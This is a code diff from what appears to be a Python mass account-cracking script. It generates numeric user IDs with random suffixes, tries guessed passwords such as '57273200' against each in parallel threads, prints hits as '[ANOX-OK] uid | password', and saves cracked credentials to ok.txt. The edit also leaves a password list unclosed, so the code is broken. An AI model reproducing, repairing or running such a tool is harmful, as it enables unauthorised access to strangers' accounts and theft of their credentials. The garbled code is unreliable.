@@ -410,10 +410,7 @@ def random_number():
 			uid = kode+guru
 			mk = uid[:6]
 			pwx = [kode+guru,mk,'57273200','59039200','57273200']
-			pwx = [kode+guru,mk,'57273200','59039200','57273200']
-			mk = uid[:6]
-			pwx = [guru]
-			mk = uid[:6]
+			pwx = [kode+guru,mk,'57273200','59039200','57273200'
 			pwx = [kode+guru,mk,'57273200','59039200','57575751']
 			yaari.submit(rcrack,uid,pwx,tl)
 
@@ -430,7 +427,7 @@ def random_number():
 	menu()
 	
 
-    
+
 
 def rcrack(uid,pwx,tl):
 
@@ -526,7 +523,7 @@ def rcrack(uid,pwx,tl):
 
 				print('\r\033[1;32m[ANOX-OK] '+uid+' | '+ps)
 
-				cek_apk(coki)
+				cek_apk()
 
 				open('ok.txt', 'a').write(uid+' | '+ps+'\n')
 
